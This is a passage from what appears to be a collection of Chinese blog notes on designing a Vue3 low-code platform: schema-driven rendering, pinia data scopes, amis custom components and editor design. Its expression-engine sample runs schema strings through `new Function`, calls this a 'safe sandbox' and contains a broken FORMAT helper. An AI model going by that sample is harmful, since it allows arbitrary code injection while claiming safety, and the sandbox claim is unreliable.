增量业务都**要求按照低代码的研发模式**\n- 因为低代码也在持续研发过程中，实在满足不了的场景\n\t- 通过`模块联邦`的方式，**自由组件开发**，这是一种**纯高代码开发模式**\n\n## 6. 开发与搭建模式\n\n目前市面上的低代码都会提供正常三种模式，如下图\n\n![图片&文件](./files/20241201-20.png)\n\n他们的关系如下图：\n\n![图片&文件](./files/20241201-21.png)\n\n> 更到可参考 [1. 分享：基于低代码平台的三种开发模式](/post/Wel2FVUi.html)\n\n## 7. 更多\n\n![图片&文件](./files/20241201-19.png)\n\n## 8. LowCode 与 ProCode 的==混合研发模式==\n\n### 8.1. 关键要点\n\n- 在某些复杂应用难以适配的问题如何解决?\n- 理想的混合研发链路需要**解决多分支管理、组件统一管理以及一体化打包构建**等问题,但实施成本较高。\n- 一种轻量级的混合研发链路可以通过应用集成和页面集成在低代码平台上完成，简化了分支管理和组件引用的问题。\n- 页面研发应实现应用层面和页面层面的融合，组件可以在 Pro代码 和 低代码应用间互相引用。\n- 未来可以进一步探索,不再区分Pro代码和低代码页面,而是采用工业领域物料清单的方式组装页面\n\n### 8.2. 低代码研发流程\n\n![图片&文件](./files/20241201-3.png)\n\n### 8.3. 现状\n\n#### 8.3.1. 组件类型分类\n\n- VC 组件：中后台低代码组件，符合《低代码引擎物料协议规范》，可以在低代码页面中使用的组件\n\t- 类比于 **自由组件**（能科的叫自由瓦片）\n- 低代码组件：\n- PRO Code：纯外部组件\n\n#### 8.3.2. 问题\n\n- VC 组件 和 LowCode 组件都是一个个的包，需要进行**复杂的包管理**\n- VC 组件不受低代码平台强控制，比如分支都没有\n\t- **能约束的就是一个脚手架，之后就是泼出去的水了**\n\t- 一个解法是：项目组一个大仓库来管理，大的包管理\n\n### 8.4. 解法\n\n- 低代码平台上维护所有组件类型\n- Pro Code 组件 & 自由组件大仓库管理，按版本管理\n\n### 8.5. 不同组件是如何引用的？\n\n#### 8.5.1. 完全独立，如下图：\n\n![图片&文件](./files/20241201-4.png)\n\n解法：\n- 通过 URL 嵌入的方式\n- 通过无界微前端的方式直接陷入\n\n#### 8.5.2. 简单的融合\n\n![图片&文件](./files/20241201-5.png)\n\n- 要么分别创建 ProCode 应用和 LowCode 应用再做集成\n- 要么以 `iframe` 的形式嵌入\n\n#### 8.5.3. 理想的融合方式\n\n![图片&文件](./files/20241201-6.png)\n\n- 应用上不做 ProCode 应用和 LowCode 应用的区分\n- 页面上不区分 ProCode 还是 LowCode 的组件和模块，都有一致的引入方式。\n\t- ProCode 的模块/组件 和 LowCode 的模块和组件在研发态有区分，但是在消费态有一致的表现\n- 页面、模块类型和组件可以让用户自己决定是用 ProCode 还是 LowCode\n\n\n\n## 9. 参考\n\n- https://mp.weixin.qq.com/s/Ynk_wjJbmNw7fEG6UtGZbQ","p33cAR0d":"\n# 调研：低代码渲染设计思路\n\n`#lowcode` \n\n\n## 目录\n<!-- toc -->\n ## 1. JSON Schema 协议 \n\n**低代码渲染引擎**将 `json` 渲染到浏览器中\n\n![图片&文件](./files/20241201-7.png)\n\n- 低代码渲染都按照这一份标准来做\n\t- 不同部门、团队、公司低代码解析都是一致的\n\t- 这样各类物料、产物就可**无障碍流通**了\n\n所以，**协议标准**非常重要\n\n- 组件的来源\n\t- 产物放在 `urls` 字段 ，包括 `js/css`等，使用 `unpkg`\n\t\t- 需要打包成 `UMD` 资源\n\t\t- ![图片&文件](./files/20241201-8.png)\n\n\n所以，这里要求类似于 `unpkg` 的打包方式\n- 平台提供管理后台，提供详细的管理各类包管理方式，比如查看，删除包（不推荐），更新覆盖，清除缓存\n\t- 内部自己搭建的 `minio`： https://github.com/minio/minio\n- 可参考 `unpkg` ，但内部已经有 `minio` 了\n\n## 2. 运行时渲染\n\n页面 `schema` 渲染成页面**都是在浏览器中完成的，不存在预编译的过程**，如下图：\n\n![图片&文件](./files/20241201-11.png)\n\n\n比如我们要渲染的一个页面，可以把它解析成一个树状结构，而其中的最底层的节点就是**我们最小粒度的组件**。\n- 对于这个**组件**，我们需要支持的能力主要是：  \n\t- 获取源码组件  \n\t- 解析组件的 `props`  \n\t- 获取组件的 `children`  \n\t- 保留并传入**上下文**，包括循环上下文，插槽上下文等;  \n\t- 节点更新，当参数变化时需要更新对应的节点  \n\t- 节点循环处理  \n\t- 获取节点实例并进行存储  \n- 而比组件更大的一个纬度来说，也就是**页面的渲染**，而他们的能力需要：  \n\t-  页面生命周期的生成和执行；  \n\t- 页面内组件树描述生成，并递归处理单个组件；  \n\t- **页面上下文生成**，\n\t\t- 比如数据源 State、低代码组件的 Props 等。  \n\t- 页面 API 支持等\n\n### 2.1. 组件渲染思路\n\n#### 2.1.1. 获取组件源码，在 CDN 上\n\n根据 Node 的 `componentName/type` 属性获取，有专门的`公共 utils` 来做这个事情，类似于下图\n\n![图片&文件](./files/20241201-13.png)\n\n#### 2.1.2. 解析 JSON schema 拉取特定组件渲染\n\n- 根据 type 拿到具体的 `lowcode` 组件后，本质是一个 **Vue 组件**，渲染该组件即可\n- ID 字段：\n\t- ID 字段和 Type 字段可以保证唯一\n\t- ID 字段还会用于组件间互相调用\n\t- 如何生成呢？\n\t\t- 位置信息，每次拖入时，会给一个 id，保证配置的时候能够串起来\n- 如果碰到 children 属性，说明需要**继续递归渲染**即可\n- 每个组件都有特定的一些生命周期，需要做特定的事情，这个在规范里有体现\n\t- **初始化 onMounted**时，需要通过公共 `utils` 去拿该组件的数据流信息\n\t\t- 注意 ① ：**一个页面对应用一个 pinia**\n\t\t\t- 所以，我们对 pinia 做了很多公共方法的包装，方便初始化 pinia ，调用其他方法的数据\n\t\t\t- Pinia 本身设计高效，适度使用不会造成明显性能问题，但不建议为每个组件创建独立 store\n\t\t\t\t- 避免创建过多小而分散的 store\n\t\t\t- 所以，我们的做法是：`type = page`的页面统一维护 `store[\"page-${id}\"]`\n\t\t\t\t- 挂在该页面下的组件 `State` 通过放在 `store[\"page-${id}\"]` 下面的 `\"${type}-${id}\"` 字段来维护\n\t\t\t\t\t- 这要做的好处\n\t\t\t\t\t\t- ① 组件间交互调用就方便了，互相暴露各自的方法，统一处理 pinia\n\t\t\t\t\t\t\t- 事件流设计也依赖这个\n\t\t\t\t\t\t\t- 每个组件都有对外暴露的**事件表、动作表**\n\t\t\t\t\t\t\t- 以及组件树的互相引用 Ref\n\t\t\t\t\t\t\t\t- 都是能够互相拿到，比如 `getParent` 或者 `getChildren` 等等\n\t\t\t\t\t\t\t\t- 主要适用于，**写代码实现自定义事件流**\n\t\t\t\t\t\t- ② pinia 本身是响应式，避免了一个props 修改，导致整个组件树渲染\n\t\t\t\t\t\t- ③ 保证 `pinia` 内存占用说太高\n\t\t- 注意②：==预加载：==拉取相关的数据\n\t\t\t- 比如碰到 `init:url` ，就知道该页面需要哪些数据源\n\t\t\t- 如果组件也配置了 `init:url` ，那么到组件渲染时，会拉取数据，但是数据是挂在 `page-id` 下面的\n\t- 卸载时\n\t\t- 不要马上卸载 Store 里面的数据，保留最近 20 条页面，持久化到本地的\n\t\t\t- 比如使用 LRU 缓存算法\n\t\t\t- 为什么 20 条就够了\n\t\t\t\t- 一些复杂组件，很容易就一万条\n\t\t\t\t- localstrage 都很容易超了\n\t\t- 这样能保证切换页面时，马上能够马上渲染出来\n- 这里没有说**数据流设计、和事件机制**，下面会展开\n\n#### 2.1.3. 数据流设计\n\n结合 `pinia` 和 `amis` 的数据域概念\n- 本身 `pinia` 轻量，响应式，性能可控\n- 最终存储的是：\n\t- `\btype=app`的协议\n\t\t- 里面不同页面存在 `pages字段里面` 里面\n- 严格的 **store 设计**\n\t- global\n\t\t- 用户信息，主题，个人配置项目等等\n\t\t- 正常来讲，不推荐获取其他信息，**比如 url 参数，localstorge 的信息，都是推荐放到 global 里面**\n\t\t- 监听全局数据\n\t- app-id\n\t\t- 应用信息，配置信息，应用风格\n\t\t- 可监听全局数据\n\t- page-id\n\t\t- 页面的 schema 信息\n\t\t- 可互相监听数据\n\t- 组件\n\t\t- 可以获取上面的数据信息\n\t\t- 可互相监听，因为都是响应式数据\n\t\t- ==特殊组件==可以使用自己的数据流命名空间： `com-id`\n\t\t- store 还有有个属性，type ，来区分 store的类型\n\t\t\t- global\n\t\t\t- app\n\t\t\t- page\n\t\t\t- com\n\t\t\t- 等等\n\t- 公共方法封装：\n\t\t- 数据交互，数据流很清晰\n\t\t- 封装很多方法，保证可以互相访问对应的 `Store` 数据\n- 原理：\n\t- **本质是遍历协议 JSON 树** \n\t- 根据不同类型，初始化数据\n\t\t- 比如遇到 `type = app` \n\t\t\t- 需要初始化 app 信息\n\t\t- type = page\n\t\t- type = 具体组件时\n\t\t- `type = wujie` \n\t\t\t- `subapp`\n\t\t- type= `iframe` ，完全使用iframe\n\t\t- `type= free` \n\t\t- 等等\n\n#### 2.1.4. 处理节点更新机制\n\n当数据源变化的时候，我们需要对页面进行更新，主要有两种更新方式，**全量更新**和**增量更新。**\n\n![图片&文件](./files/20241201-14.png)\n\n- **因为 pinia 数据源的响应性**，所以**天然能够做到增量更新，不会有全量更新的性能问题**\n\t- 阿里低代码和 amis 使用的 `mobx`，也是这个道理\n- JSON 数据的 data 对应到 渲染时，都会转成 响应式数据，并且都会存到 pinia 中\n- 至于组件自己的状态，组件实现就好了\n\n### 2.2. 页面渲染\n\n- store 存储的最小粒度，命名空间为 `page-id`，特殊组件除外\n- 疑问❓\n\t- 那岂不是单独开发组件，不能独立于应用和页面？\n\t\t- 不是，因为 JSON schema 数据域的概念，自己配一个 `mock data url` 或者 data 字段就好\n- 页面的生命周期：\n\t- 本质还是一个 Vue3 组件，使用 **Vue 的生命周期**，在特定时机做应该做的事情即可\n\t- JSON 配置的时候\n\t\t- 可添加 `onMouted` 等生命周期中添加：\n\t\t\t- 特定的自定义 JS 片段，然后就能够做特定周期能做的事情了\n\t\t- 但注意，一定是 `JS 字符串`\n\t\t- 这个很类似于 `Vue` 的 `Hooks` 执行逻辑\n\t\t\t- 生命周期钩子函数\n- 页面上下文与应用上下文\n\t- 上下文、状态和数据管理可以考虑使用 `__proto__` 来实现的，类似于 **js 的原型链**\n\t\t- ![图片&文件](./files/20241201-15.png)\n- 公共的方法会初始化到 `env` 对象中，任何地方都可以使用（app、page、组件）\n\n### 2.3. 应用渲染思路\n\n- 初始化应用相关的数据\n\t- 数据存储到 `store` 的 `app-id` 里面 \n- menu\n- 维度区分\n\t- 项目、app\n\t\t- menus / pages\n\t\t\t- 页面 `schema` \n- 后端存储数据的依据是 `schema` \n\n## 3. 出码渲染？\n\n![图片&文件](./files/20241201-9.png)\n\n- 出码渲染：\n\t- 是将 `schema` 转化为 Vue 源码、React 源码或者其他语言的源码。\n- 像 React 工程一样\n\t- 需要进行打包构建才能在浏览器中渲染一样，我们会将 React/其他源码进行打包，打包成一份 Bundle 文件，之后就可以在浏览器中进行消费，渲染出页面了\n- 以上的过程大多数都是在**构建服务**中进行的，而 Bundle 渲染为页面是**在浏览器中**完成的，\n\t- 这一部分本身都是依赖市面上成熟的前端框架，比如 React、Vue 等，所以这时候**在浏览器的运行时已经不存在低代码渲染**了。\n\t- **所以：相对于运行时渲染而已，性能相对会好一些**\n\n\n但是，这一步本质是**编译的工作更重些**，参考阿里低代码引擎的设计思路，下图：\n\n![图片&文件](./files/20241201-10.png)\n\n- **个人认为，这一步的性价比得评估一下，阿里这样的大厂可以考虑，小公司就别想了**\n- 如果运行时真的很慢\n\t- 可以考虑使用**模块联邦**的方式，直接拉取异步组件渲染，\n\t- 但这样不好的地方在于，不能配置了，完全属于 `Pro Code`\n\n### 3.1. 未来呢，需要出码吗\n\n理论上将，将 JSON DSL 转成 Vue 工程，这条路本身就是通的\n\n**所以先做运行时，如果未来真有这场景，在做不迟**\n\n产品业务层面要考虑的事情，技术侧是能够实现的\n- 分析了，工业领域，移动端场景：\n\t- 完全不一样的业务场景，完全做两个版本即可\n\n为什么移动端和 PC 要分开，这是因为：\n- 业务场景本来就是分开的，两端都需要展示相对较少\n\n## 4. 参考\n\n- https://mp.weixin.qq.com/s/yqYey76qLGYPfDtpGkVFfA \n- amis \n- 阿里低代码引擎\n","BmnCr1gr":"\n# 调研：Amis 工作原理、自定义组件\n\n`#lowcode` \n\n\n## 目录\n<!-- toc -->\n ## 1. 工作原理 \n\n- 渲染过程就是根据`节点 type` 信息，跟**组件池**中的找到对应的组件实现\n\t- 如果命中，则把当前节点转给对应组件渲染，节点中其他属性将作为目标组件的 props。\n\t- 如果是容器组件，比如以上例子中的 `page` 组件，从 props 中拿到的 `body` 是一个子节点\n\t- 由于节点类型是不固定，由使用者决定，所以不能直接完成渲染\n\t\t- 所以交给属性中下发的 `render` 方法去完成渲染，`{render('body', body)}`，他的工作就是拿子节点的 type 信息去组件池里面找到对应的渲染器，然后交给对应组件去完成渲染。\n\n## 2. 自定义组件：SDK\n\n### 2.1. 属性\n\n| 属性名       | 类型        | 默认值      | 说明                              |\n| --------- | --------- | -------- | ------------------------------- |\n| type      | 'custom'  |          |                                 |\n| id        | `string`  |          | 节点 id                           |\n| name      | `string`  |          | 节点 名称                           |\n| className | `string`  |          | 节点 class                        |\n| inline    | `boolean` | false    | 默认使用 div 标签，如果 true 就使用 span 标签 |\n| html      | `string`  |          | 初始化节点 html                      |\n| onMount   | `string`  | Function | 节点初始化之后调的用函数                    |\n| onUpdate  | `string`  | Function | 数据有更新的时候调用的函数                   |\n| onUnmount | `string`  | Function | 节点销毁的时候调用的函数                    |\n\n### 2.2. onMount\n\n这是节点在初始化的时候执行的函数，它接收三个参数：\n- dom\n\t- 组**件加载之后的 dom 节点**\n- data\n\t- 组件初始值，需要设置 name\n- onChange\n\t- 修改这个组件对应 name 的值\n- props，后面会单独介绍\n\n```javascript\n{\n  type: 'page',\n  title: '表单页面',\n  body: {\n    type: 'form',\n    title: 'custom 组件',\n    body: [\n      {\n        type: 'custom',\n        name: 'myName',\n        label: '自定义组件',\n        onMount: (dom, value, onChange, props) => {\n          const button = document.createElement('button');\n          button.innerText = '点击修改';\n          button.onclick = event => {\n            // 这个 onChange 方法只有放在表单项中才能调用，第二个参数是表单项名称\n            onChange('new', 'myName');\n            event.preventDefault();\n          };\n          dom.appendChild(button);\n        }\n      },\n    ]\n  }\n}\n```\n\n-  `type = free`\n\t- 模块联邦的方式嵌入\n\n### 2.3. props\n\n前面可以看到所有函数最后都有一个 `props 参数`，在这个参数里能拿到 amis 内部属性和方法，比如弹框\n\n```javascript hl:6\nonMount: (dom, data, onChange, props) => {\n  const button = document.createElement('button');\n  button.innerText = '点击修改姓名';\n  button.onclick = event => {\n    onChange('new name', 'name');\n    props.onAction(\n      event,\n      {\n        type: 'action',\n        label: '弹个框',\n        actionType: 'dialog',\n        dialog: {\n          title: '弹框',\n          body: 'Hello World!'\n        }\n      },\n      {} // 这是 data\n    );\n    event.preventDefault();\n  };\n  dom.appendChild(button);\n};\n```\n\n> 或者执行 `props.env.notify('success', '执行成功')` 来在右上角弹出提示等\n\n### 2.4. onUpdate\n\n```javascript\nonUpdate: (dom, data, prevData, props) => {\n    console.log('data', data, prevData)\n}\n```\n\n### 2.5. vue\n\n```javascript\n{\n  type: 'page',\n  title: '表单页面',\n  body: {\n    type: 'form',\n    title: 'custom 组件',\n    body: [\n      {\n        type: 'custom',\n        name: 'my-custom',\n        html: `\n        <ol>\n          <li v-for=\"todo in todos\">\n            {{ todo.text }}\n          </li>\n        </ol>\n        `,\n        label: '自定义组件',\n        onMount: (dom, data, onChange, props) => {\n          const app = new Vue({\n            el: dom,\n            data: {\n              todos: [\n                { text: 'hello' },\n                { text: 'world' },\n                { text: 'vue' }\n              ]\n            }\n          })\n        }\n      }\n    ]\n  }\n}\n```\n\n## 3. 自定义组件：React\n\n### 3.1. 组件间通信：上下文机制\n\n- 一个好的思路，需要再注册，运行时实例注册进来，方便通讯，那么和数据流有什么关系？\n- `Scoped.tsx`会把里面的**运行时实例注册进来**，方便组件之间的通信\n\namis 中有个机制就是，把需要被引用的组件设置一个 name 值，然后其他组件就可以通过这个 name 与其通信\n\n```js hl:2,11,16\nimport * as React from 'react';\nimport {Renderer, ScopedContext} from 'amis';\n@Renderer({\n  type: 'my-renderer'\n})\nexport class CustomRenderer extends React.Component {\n  static contextType = ScopedContext;\n\n  constructor() {\n    const scoped = this.context;\n    scoped.registerComponent(this);\n  }\n\n  componentWillUnmount() {\n    const scoped = this.context;\n    scoped.unRegisterComponent(this);\n  }\n\n  // 其他部分省略了。\n}\n```\n\n看看 `ScopedContext` 定义\n\n```typescript\nexport interface IScopedContext {  \n  rendererType?: string;  \n  component?: ScopedComponentType;  \n  parent?: AliasIScopedContext;  \n  children?: AliasIScopedContext[];  \n  registerComponent: (component: ScopedComponentType) => void;  \n  unRegisterComponent: (component: ScopedComponentType) => void;  \n  getComponentByName: (name: string) => ScopedComponentType;  \n  getComponentById: (id: string) => ScopedComponentType | undefined;  \n  getComponentByIdUnderCurrentScope: (  \n    id: string,  \n    ignoreScope?: IScopedContext  \n  ) => ScopedComponentType | undefined;  \n  getComponents: () => Array<ScopedComponentType>;  \n  reload: (target: string, ctx: RendererData) => void | Promise<void>;  \n  send: (target: string, ctx: RendererData) => void;  \n  close: (target: string) => void;  \n  closeById: (target: string) => void;  \n  getComponentsByRefPath: (  \n    session: string,  \n    path: string  \n  ) => ScopedComponentType[];  \n  doAction: (actions: ListenerAction | ListenerAction[], ctx: any) => void;  \n}\n```\n\n### 3.2. env 对象\n\n自定义的渲染器 props 会下发一个非常有用的 **env 对象**。这个 env 有以下功能方法。\n\n- `env.fetcher` 可以用来做 ajax 请求\n\t- 如： `this.props.env.fetcher('xxxAPi', this.props.data).then((result) => console.log(result))`\n- `env.confirm` 确认框，返回一个 promise 等待用户确认\n\t- 如： `this.props.env.confirm('你确定要这么做？').then((confirmed) => console.log(confirmed))`\n- `env.alert` 用 Modal 实现的弹框\n- `env.notify` toast 某个消息 \n\t- 如： `this.props.env.notify(\"error\", \"出错了\")`\n- `env.jumpTo` 页面跳转。\n\n>  这些很多公用方法也可以封装 pinia 里面了\n\n\n## 4. amis 内置了调试工具\n\n可以查看组件内部运行日志，方便分析问题，目前在文档右侧就有显示。\n\n默认不会开启这个功能，可以通过下面三种方式开启：\n1. render 的 env 里设置 `enableAMISDebug`。\n2. 配置全局变量 `enableAMISDebug` 的值为 `true`，比如 `window.enableAMISDebug = true`。\n3. 在页面 URL 参数中加上 `amisDebug=1`，比如 `http://xxx.com/?amisDebug=1`。\n\n## 5. 多包结构\n\n- 使用 `pnpm workspace`\n\n### 5.1. 组件包：所有的组件入口\n\n![图片&文件](./files/20241107-1.png)\n\n- 必须统一都在一个地方写，并且必须有规范，比如样式、vue、schema 文件等等\n\n### 5.2. 组件注册，使用最小集来注册，避免包过大\n\n![图片&文件](./files/20241107.png)\n\n\n","9pYXVJjs":"\n# 调研：各类大会对低代码的分享\n\n\n`#lowcode` \n\n\n## 目录\n<!-- toc -->\n ## 1. 多技术栈及高低代码混合开发（华为云低代码平台架构探讨） \n\n### 1.1. 低代码源于需求\n\n![图片&文件](./files/20241110-4.png)\n\n### 1.2. 低代码如何考虑存量业务\n\n如何在画布里展现不同技术栈的 UI 组件?\n\n- 答案是：利用 `Web Component` 在画布展现不同技术栈的组件\n\t- 三大主流前端框架都提供官方 `Web Component` 转换工具\n\t- UI 组件都用 `Web Component` 包裹后再显示到画布上生成的代码引用原始 UI 组件，而非 Web Component\n\n## 2. 贝壳中台化建设下的前端体系探索\n\n### 2.1. 贝壳的业务和组织背景\n\n![图片&文件](./files/20241110-1.png)\n\n### 2.2. 重点\n\n- 搜集组件使用数据，**评价和回归**\n\t- ![图片&文件](./files/20241110-2.png)\n- 接入灵活，随写随用，开发、测试、上线流畅\n\t- 比如可以写个插件，只要引用了组件库，可以==随时调用评价，录屏或者报错==，使用文档等等\n\t- 提报 Bug 等\n\n## 3. 阿里低代码引擎和生态建设实战及思考\n\n> 更多参考：[8. 好文：阿里低代码引擎和生态建设实战及思考](/post/h0cXNUg9.html)\n\n## 4. 低代码平台架构深度剖析\n\n> 更多参考 [23. 【精读】低代码平台架构深度剖析@832](#)\n\n\n","BhL4h8x7":"\n# 调研：编辑器&设计态如何设计?\n\n`#lowcode` \n\n\n## 目录\n<!-- toc -->\n ## 1. Amis：设计态渲染有什么不一样？ \n\n- 编辑器在渲染 `amis` 配置的时候，会把所有的 json（配置） 节点都自动加个 `$$id` 唯一 id。然后复写了 `rendererResolver` 方法。\n- 某个节点 `{type: 'xxxx'}` 在找到对应 amis 组件渲染前，都会调用这个方法。 这个方法会在渲染之前，基于 schema、渲染器信息，通过插件去收集编辑器信息\n\t- 如果收集到了，会额外的通过一个 `Wrapper` 包裹。\n\t- 这个 `Wrapper` 主要是自动把 `$$id` 写入到 dom 的属性上`data-editor-id=\"$$id\"`。\n\t- 这样鼠标点击的时候，能够根据 dom 上的标记知道是哪个 json 节点，同时根据渲染器编辑器信息，能够生成对应的配置面板，并把对应 json 的节点做配置修改。\n\t- 有些组件是带区域的，所以除了 dom 上标记节点信息外，还需要标记区域信息。节点能够通过 `Wrapper` 自动包裹来实现，但是区域则不能，这个要去分析组件本身是怎么实现。\n\t- 最终目的是要通过 `RegionWrapper` 去包裹对应 `JSX.Element` 来完成标记。这个 `RegionWrapper` 会自动完成 dom 的标记 `data-region=\"xxx\" data-region-host=\"$$id\"`，这样点击到这个 dom 的时候，能知道是哪个组件的哪个区域，这样就能往里面拖入新组件。\n\n左侧的组件列表主要是将收集到的渲染器编辑器信息做个汇总展示，可拖入到指定区域内。\n\n## 2. 撤销及快捷键设计\n\n- 撤销、返回使用 `undo` \n\t- 类似于 `redux-undo` 的插件\n- pinia 有类似于的插件\n- 再结合快捷键即可\n\n## 3. Amis ：plugins 目录\n\n- 如果是`弹框类`的，统一放到一个组件里，所以单独提一个组件来渲染，以方便配置\n- `makeWrapper` \n- 各类 `Wrapper` 组件，包裹起来，方便配置，选中\n- 关于预览，如果是移动端，\n\t- 使用 iframe 预览\n\t- PC 正常预览\n- 有点类似于之前些的 `SchemaEditor` 组件\n- 每个组件都有一个对应的插件，需要时注册进去\n\t- ![图片&文件](./files/20241108.png)\n\t- 在里面需要**写详细的信息，比如任何配置**\n\t- 或者其他有助于开发的\n\t\t- 组件的`文档地址`\n\t\t- 组件的`截图`\n\t- 右侧，并且这些其实都是可以配置，都源于组件的设计态\n\t\t- 属性\n\t\t- 外观\n\t\t- 事件等等\n\n## 4. 设计态是个细活\n\n- 设计态绝对是一个细活\n- 比如拖入需要配置数据源的组件表格，一拖进来，应该是配置必要的数据源，配置完后方便展示\n\t- 否则就是空的了\n- 因为 `amis` 的设计，最终拖入的都是基于 json 的编辑以及渲染\n- 功能细节点，很多很多的，所以**设计态初版**好做，但想做的很好，很难的，特别是面向非程序员的\n\t- ![图片&文件](./files/20241108-1.png)\n- 比如各类快捷键等等\n\n## 5. 竞品长什么样？微搭、爱搭、宜搭 → 所以知道这是个工作量大的细活\n\n### 5.1. 设置区域\n\n![图片&文件](./files/20241201-69.png)\n\n\n![图片&文件](./files/20241201-67.png)\n\n### 5.2. 可选组件列表参考\n\n![图片&文件](./files/20241201-68.png)\n\n### 5.3. 主题设计器\n\n![图片&文件](./files/20241201-70.png)\n\n## 6. 数据源如何选择\n\n### 6.1. 数据库建模\n\n- 智能体厂\n- 直连数据库\n- 等等\n\n> 这个挺多，各大云平台都有产品可参考\n\n### 6.2. API 编排的方式\n\n![图片&文件](./files/20241108-5.png)\n\n![图片&文件](./files/20241108-4.png)\n\n## 7. 前沿：如何结合 AI 的能力\n\n- 自然语言描述，自动生成特定 json 结构即可\n- AI 搭建助手\n- 更高的能力，需要模型训练\n\n### 7.1. AI 能力展示：微搭、爱搭、宜搭\n\n![图片&文件](./files/20241108-2.png)\n\n- 还是基本的使用 `chatbot` 的方式来搭建\n- 上传 `PRD 文档`，可直接生成内容\n- 平台搭建解惑\n- 开发助手：智能对话\n\n![图片&文件](./files/20241201-64.png)\n\n\n![图片&文件](./files/20241201-65.png)\n\n![图片&文件](./files/20241108-3.png)\n\n![图片&文件](./files/20241201-66.png)\n\n\n\n\n\n\n","bmJbsVI0":"\n# 基于 Vue3 的低代码平台架构设计：篇一\n\n`#lowcode` \n\n\n## 目录\n<!-- toc -->\n ## 1. 核心理念 \n\n与 `Amis` 类似，我们采用 **JSON 配置**驱动的方式来构建页面。主要包含以下核心概念：\n\n- **Schema 驱动渲染** \n\t- 通过 JSON 描述页面结构和行为\n- **组件注册机制**\n\t- 灵活的组件注册和扩展系统\n- **数据域管理**\n\t- 独立的数据作用域\n\t- 建议使用 `pinia`\n- **表达式引擎** \n\t- 处理动态数据和条件判断\n- **事件系统** \n\t- 统一的事件处理机制\n\n## 2. 技术架构图\n\n让我用 `Mermaid` 来绘制架构图：\n\n````mermaid\n\n\n  graph TD\n    A[Schema JSON] --> B[Schema Parser]\n    B --> C[Component Factory]\n    C --> D[Runtime Renderer]\n    D --> E[页面实例]\n    \n    F[组件库] --> C\n    G[表达式引擎] --> D\n    H[数据域] --> D\n    I[事件系统] --> D\n    \n    subgraph 核心引擎\n    B\n    C\n    D\n    end\n    \n    subgraph 扩展系统\n    F\n    G\n    H\n    I\n    end\n````\n\n## 3. 渲染引擎\n\n渲染引擎是整个框架的核心，负责解析 Schema 并渲染组件。以下是核心渲染器的示例代码：\n\n### 3.1. types/schema.ts\n\n```typescript\n// types/schema.ts\ninterface Schema {\n  type: string;\n  props?: Record<string, any>;\n  children?: Schema[];\n  data?: Record<string, any>;\n}\n```\n\n### 3.2. components/Renderer.vue\n\n```vue hl:19,21,22\n\n<script setup lang=\"ts\">\nimport { computed, provide, inject } from 'vue';\nimport { resolveComponent } from 'vue';\n\nconst props = defineProps<{\n  schema: Schema;\n  data?: Record<string, any>;\n}>();\n\n// 数据域管理\nconst parentData = inject('scopeData', {});\nconst currentData = computed(() => ({\n  ...parentData,\n  ...props.data\n}));\nprovide('scopeData', currentData);\n\n// 解析组件\nconst resolveSchemaComponent = (type: string) => {\n  // 1. 查找注册的自定义组件\n  // 2. 回退到 Vue 内置组件\n  return resolveComponent(type) || resolveComponent('div');\n};\n\n// 处理属性\nconst resolveProps = (props: Record<string, any>) => {\n  return Object.entries(props).reduce((acc, [key, value]) => {\n    // 处理表达式\n    acc[key] = typeof value === 'string' && value.startsWith('${') \n      ? evaluateExpression(value, currentData.value)\n      : value;\n    return acc;\n  }, {});\n};\n</script>\n\n<template>\n  <component\n    :is=\"resolveSchemaComponent(schema.type)\"\n    v-bind=\"resolveProps(schema.props || {})\"\n  >\n    <template v-if=\"schema.children\">\n      <Renderer\n        v-for=\"(child, index) in schema.children\"\n        :key=\"index\"\n        :schema=\"child\"\n      />\n    </template>\n  </component>\n</template>\n\n```\n\n## 4. 组件注册系统\n\n>  结合异步组件来做，系统本身只提供部分核心组件\n\n```typescript\n// core/registry.ts\ninterface ComponentMeta {\n  component: Component;\n  schema?: Record<string, any>;\n  validations?: Record<string, Function>;\n}\n\nclass ComponentRegistry {\n  private components: Map<string, ComponentMeta> = new Map();\n\n  register(type: string, meta: ComponentMeta) {\n    this.components.set(type, meta);\n  }\n\n  get(type: string): ComponentMeta | undefined {\n    return this.components.get(type);\n  }\n\n  // 批量注册\n  registerMultiple(components: Record<string, ComponentMeta>) {\n    Object.entries(components).forEach(([type, meta]) => {\n      this.register(type, meta);\n    });\n  }\n}\n\nexport const registry = new ComponentRegistry();\n```\n\n## 5. 表达式引擎\n\n>  请结合使用 `loadsh` 里面的各类工具类函数\n\n```typescript hl:15\n// core/expression.ts\nexport function evaluateExpression(expr: string, data: Record<string, any>) {\n  // 移除 ${} 包裹\n  const script = expr.slice(2, -1).trim();\n  \n  // 构建安全的执行环境\n  const context = {\n    ...data,\n    // 内置函数\n    FORMAT: (val: any, format: string) => format(val),\n    IF: (condition: boolean, then: any, else_: any) => condition ? then : else_,\n  };\n\n  try {\n    // 使用 Function 构造器创建沙箱环境\n    const fn = new Function(...Object.keys(context), `return ${script}`);\n    return fn(...Object.values(context));\n  } catch (e) {\n    console.error('Expression evaluation failed:', expr, e);\n    return undefined;\n  }\n}\n```\n\n## 6. 事件系统\n\n- 提供注册事件能力\n- 注意需要注册特定的上下文\n\n```typescript hl:12\n// core/events.ts\ntype ActionType = 'ajax' | 'link' | 'dialog' | 'custom';\n\ninterface Action {\n  type: ActionType;\n  config: Record<string, any>;\n}\n\nclass EventManager {\n  private handlers: Map<ActionType, Function> = new Map();\n\n  register(type: ActionType, handler: Function) {\n    this.handlers.set(type, handler);\n  }\n\n  async execute(action: Action, context: any) {\n    const handler = this.handlers.get(action.type);\n    if (!handler) {\n      throw new Error(`No handler registered for action type: ${action.type}`);\n    }\n    return handler(action.config, context);\n  }\n}\n\nexport const eventManager = new EventManager();\n```\n\n## 7. 示例：基础页面配置\n\n>  需要考虑如何和数据模块结合，`options` 的来源如何获取\n\n```typescript hl:27\n// 页面配置示例\nconst schema = {\n  type: 'page',\n  props: {\n    title: '用户管理'\n  },\n  children: [\n    {\n      type: 'form',\n      props: {\n        api: '/api/users'\n      },\n      children: [\n        {\n          type: 'input',\n          props: {\n            name: 'username',\n            label: '用户名',\n            required: true\n          }\n        },\n        {\n          type: 'select',\n          props: {\n            name: 'role',\n            label: '角色',\n            options: [\n              { label: '管理员', value: 'admin' },\n              { label: '用户', value: 'user' }\n            ]\n          }\n        }\n      ]\n    }\n  ]\n};\n```\n\n## 8. 示例：组件注册示例\n\n```tsx\n// components/Form.vue\nimport { defineComponent } from 'vue';\n\nexport default defineComponent({\n  name: 'Form',\n  props: {\n    api: String,\n  },\n  setup(props, { slots }) {\n    // 表单逻辑实现\n    return () => (\n      <form>\n        {slots.default?.()}\n      </form>\n    );\n  }\n});\n\n// 